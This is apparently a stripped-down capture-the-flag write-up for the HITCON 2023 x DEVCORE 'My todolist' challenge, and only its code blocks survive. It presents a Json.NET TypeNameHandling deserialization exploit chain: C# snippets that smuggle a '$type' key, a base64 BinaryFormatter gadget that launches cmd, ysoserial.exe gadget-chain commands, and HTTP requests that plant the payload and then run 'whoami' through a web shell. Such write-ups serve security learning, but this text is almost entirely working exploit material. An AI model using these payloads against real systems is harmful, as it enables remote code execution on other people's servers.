# HITCON 2023 x DEVCORE Wargame: My todolist Write-up

> 原文: https://www.ctfiot.com/136182.html
> ID: 136182


```
public static T Clone<T>(this T source) {
 JsonSerializerSettings settings = new JsonSerializerSettings() {
 TypeNameHandling = TypeNameHandling.All
 };
 return (T) JsonConvert.DeserializeObject(JsonConvert.SerializeObject(source, settings), settings);
}
Dictionary<string, string> source = new Dictionary<string, string>();
 source.Add("key", "value");
 JsonSerializerSettings settings = new JsonSerializerSettings() {
 TypeNameHandling = TypeNameHandling.All
 };
 string result = JsonConvert.SerializeObject(source, settings);
{
 "$type": "System.Collections.Generic.Dictionary`2[[System.String, mscorlib],[System.String, mscorlib]], mscorlib",
 "key": "value"
}
Dictionary<string, string> source = new Dictionary<string, string>();
source.Add("$type", "System.Web.Security.RolePrincipal, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");
JsonSerializerSettings settings = new JsonSerializerSettings() {
 TypeNameHandling = TypeNameHandling.All
};
JsonConvert.DeserializeObject(JsonConvert.SerializeObject(source, settings), settings);
{
 "$type": "System.Collections.Generic.Dictionary`2[[System.String, mscorlib],[System.String, mscorlib]], mscorlib",
 "$type": "System.Web.Security.RolePrincipal, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
}
Dictionary<string, string> source = new Dictionary<string, string>();
source.Add("you control the key", "you control the value");
JsonSerializerSettings settings = new JsonSerializerSettings() {
 TypeNameHandling = TypeNameHandling.All,
 MetadataPropertyHandling = MetadataPropertyHandling.ReadAhead
};
JsonConvert.DeserializeObject(JsonConvert.SerializeObject(source, settings), settings);
Dictionary<string, string> source = new Dictionary<string, string>();
source.Add("$type", "System.Web.Security.RolePrincipal, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");
source.Add("System.Security.ClaimsPrincipal.Identities", "AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAswU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIGNhbGMiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M+DQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI+Cw==");
JsonSerializerSettings settings = new JsonSerializerSettings() {
 TypeNameHandling = TypeNameHandling.All,
 MetadataPropertyHandling = MetadataPropertyHandling.ReadAhead
};
JsonConvert.DeserializeObject(JsonConvert.SerializeObject(source, settings), settings);
--bgc, --bridgedgadgetchains=VALUE
 Chain of bridged gadgets separated by comma (,).
 Each gadget will be used to complete the next
 bridge gadget. The last one will be used in the
 requested gadget. This will be ignored when
 using the searchformatter argument.
ysoserial.exe -g RolePrincipal -f Json.Net --bgc ActivitySurrogateDisableTypeCheck -c 1

ysoserial.exe -g RolePrincipal -f Json.Net --bgc ActivitySurrogateSelectorFromFile -c ".\ExploitClass.cs;dlls\System.dll;dlls\System.Web.dll"
POST /Api/UpdateTodo HTTP/1.1
Host: localhost:
8003
Content-Type: application/x-www-form-urlencoded
Content-Length: xx
Cookie: <session>

uuid=00c3abe9-1f7c-4cda-8c24-60c59ac01f3f&field=$type&value=System.Web.Security.RolePrincipal,+System.Web,+Version%3d4.0.0.0,+Culture%3dneutral,+PublicKeyToken%3db03f5f7f11d50a3a
POST /Api/UpdateTodo HTTP/1.1
Host: localhost:
8003
Content-Type: application/x-www-form-urlencoded
Content-Length: xx
Cookie: <session>

uuid=00c3abe9-1f7c-4cda-8c24-60c59ac01f3f&field=System.Security.ClaimsPrincipal.Identities&value=
POST /Api/MyProfile HTTP/1.1
Host: localhost:
8003
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Cookie: <session>

cmd=whoami
```
